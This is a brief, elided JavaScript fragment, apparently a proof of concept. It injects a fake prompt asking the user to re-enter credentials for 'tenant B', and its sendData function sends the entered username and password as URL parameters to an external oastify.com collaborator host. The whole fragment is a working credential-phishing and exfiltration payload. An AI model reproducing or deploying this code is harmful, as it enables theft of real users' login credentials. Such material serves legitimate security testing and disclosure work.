...
div.innerHTML = `
    ...
    <p>Please re-enter your credentials for tenant B:</p>
...
function sendData() {
    ...
    fetch(`https://bixkxzyk26n17bxfkx0o5yerqiw9k0loa.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
